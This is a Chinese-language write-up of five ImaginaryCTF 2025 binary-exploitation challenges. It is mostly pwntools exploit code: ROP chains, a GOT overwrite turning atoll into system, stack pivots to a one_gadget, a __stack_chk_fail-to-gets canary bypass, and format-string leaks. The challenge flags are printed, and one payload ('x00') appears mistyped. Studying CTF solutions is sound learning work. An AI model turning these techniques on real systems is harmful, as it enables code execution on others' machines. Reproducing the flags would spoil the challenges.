---
title: ImaginaryCTF 2025 Pwn by Mini-Venom
contest: ImaginaryCTF
year: 2025
difficulty: medium
vuln_type: pwn_unknown
tags: [ret2libc, GOT patch, one_gadget, 栈迁移, __stack_chk_fail 改 gets, fmt-string]
attack_chain: |
  1. babybof: 题目直接给 system/pop rdi/ret/bin_sh/canary 地址 → A*0x38 + canary + pop_rdi_ret + pop_rdi_ret (替代 ret 对齐) + bin_sh + ret + system
     - flag: ictf{arent_challenges_written_two_hours_before_ctf_amazing}
  2. addition: 任意地址加值 (类似 House of Atum 思路) → atoll GOT patch 为 system → "/bin/sh" 触发
     - got_offset = 0x4020-0x4069, patch_value = system_offset - atoll_offset
     - 然后 sendline "/bin/sh" → atoll("/bin/sh") 实际调 system
     - flag: ictf{i_love_finding_offsets_4fd29170cb90}
  3. cascade: 多次栈迁移 + magic gadget 构造 one_gadget
     - payload1: A*0x40 + p64(0x404600) + p64(0x401162) - 设置 read 缓冲目标
     - payload2: A*0x48 + p64(0x401074) - 跳到 magic gadget
     - payload3-payload7: 多次栈迁移 + ROP 链 + one_gadget offset=0xc52a0-0x201+1+0xc0
  4. twowrite: 改 __stack_chk_fail GOT 为 gets → 改 canary 环境变量 → gets 重写 canary → ret2libc
     - gets_addr = libc_base + libc.sym['gets']
     - xor_secret = libc_base - 0x2898 (TLS dtor list)
  5. imgstore: 朴实无华的 fmt-string → %17$p %18$p %19$p %25$p 读 canary/buf/pie/__libc_start_main
     - canary = 0x...
     - buf = 0x... - 0x7fffffffd350 + 0x7fffffffd2d8
     - pie = 0x... - 0x21b8
     - __libc_start_main = 0x... - 243
     - libc_base = __libc_start_main - libc.sym['__libc_start_main']
key_payload: |
  # babybof:
  payload = b"A"*0x38 + p64(canary) + p64(pop_rdi_ret) + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system_addr)
  
  # addition GOT patch atoll -> system:
  got_offset = 0x4020 - 0x4069  # 负值: 反向加
  patch_value = system_offset - atoll_offset
  p.sendline(str(got_offset))
  p.sendline(str(patch_value))
  p.sendline("/bin/sh")  # atoll("/bin/sh") -> system("/bin/sh")
  
  # cascade 多次栈迁移:
  payload1 = b'a'*0x40 + p64(0x404600) + p64(0x401162)
  payload2 = b'a'*0x48 + p64(0x401074)
  payload3 = b'a'*0x40 + p64(0x404950) + p64(0x40112C) + p64(0x4049d8-0x40) + p64(0x401088) + b'a'*0x30 + p64(offset)*8
  payload7 = b'x00'*0x48 + p64(0) + p64(0x4011C9) + p64(0x404890+0x20) + p64(0x40115E)
  
  # twowrite:
  pop_rdi_ret = libc_base + 0x000000000002a3e5
  gets_addr = libc_base + libc.sym['gets']
  # 改 __stack_chk_fail GOT 为 gets → 改 canary 环境变量 → gets 重新写 canary
one_liner: ImaginaryCTF 2025 Pwn 多题 (ret2libc 模板 / GOT patch / 多次栈迁移 / fmt-string) 速查。
lesson: |
  - ret2libc 模板: A*padding + canary + pop_rdi_ret + rdi_arg + ret + system
  - GOT patch atoll->system 是 2024-2025 流行套路 (House of Atum 思路)
  - 多次栈迁移 + one_gadget offset 计算 = cascade 难的核心
  - __stack_chk_fail GOT 改成 gets + 改 canary 环境变量可以绕过 stack smash 检测
  - fmt-string 一次性读 canary + buf + PIE + libc 是 imgstore 模板
quality: medium
---

# ImaginaryCTF 2025 Pwn by Mini-Venom

> 来源: ctfiot.com 269585

## babybof

题目直接给 `system/pop rdi/ret/bin_sh/canary` 地址：

```python
payload = b"A"*0x38 + p64(canary) + p64(pop_rdi_ret) + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system_addr)
p.sendline(payload)
```

flag: `ictf{arent_challenges_written_two_hours_before_ctf_amazing}`

## addition (GOT patch atoll → system)

```python
atoll_offset = libc.symbols['atoll']
system_offset = libc.symbols['system']
got_offset = 0x4020 - 0x4069  # 负值: 反向
patch_value = system_offset - atoll_offset

p.recvuntil("add where? ")
p.sendline(str(got_offset))
p.recvuntil("add what? ")
p.sendline(str(patch_value))
p.recvuntil("add where? ")
p.sendline("/bin/sh")  # atoll("/bin/sh") 实际调 system("/bin/sh")
```

flag: `ictf{i_love_finding_offsets_4fd29170cb90}`

## cascade (多次栈迁移 + one_gadget)

需要多次 `leave; ret` 栈迁移 + magic gadget 拼出 one_gadget：

```python
payload1 = b'a'*0x40 + p64(0x404600) + p64(0x401162)
payload2 = b'a'*0x48 + p64(0x401074)
offset = 0xc52a0 - 0x201 + 1 + 0xc0
payload3 = b'a'*0x40 + p64(0x404950) + p64(0x40112C) + p64(0x4049d8-0x40) + p64(0x401088) + b'a'*0x30 + p64(offset)*8
# ... 多次 pause + send
payload7 = b'x00'*0x48 + p64(0) + p64(0x4011C9) + p64(0x404890+0x20) + p64(0x40115E)
```

## twowrite (__stack_chk_fail 改 gets)

```python
pop_rdi_ret = libc_base + 0x000000000002a3e5
gets_addr = libc_base + libc.sym['gets']
xor_secret = libc_base - 0x2898  # TLS dtor list
```

**思路：** 把 `__stack_chk_fail` GOT 改成 `gets`，触发 canary 检测时实际调 gets，再通过环境变量修改 canary，让 gets 写入新 canary，最后 ret2libc。

## imgstore (fmt-string + ret2libc)

```python
io.sendline(b"3")  # 进入 fmt
p = b"%17$p%18$p%19$p%25$p"
io.sendline(p)

canary = int(io.recv(16), 16)
buf = int(io.recv(12), 16) - 0x7fffffffd350 + 0x7fffffffd2d8
pie = int(io.recv(12), 16) - 0x21b8
__libc_start_main = int(io.recv(12), 16) - 243
libc_base = __libc_start_main - libc.sym['__libc_start_main']
```

一次性 `%17$p %18$p %19$p %25$p` 拿 canary/buf/pie/libc_start_main。

## 评价

5 道 Pwn 速查，每道都对应 2025 Pwn 流行套路：ret2libc 模板 / GOT patch atoll→system / 多次栈迁移 one_gadget / __stack_chk_fail 改 gets / fmt-string + ret2libc。

ImaginaryCTF 历来题目偏"友好"（直接给 libc / 偏移），适合做 Pwn 入门练手场。
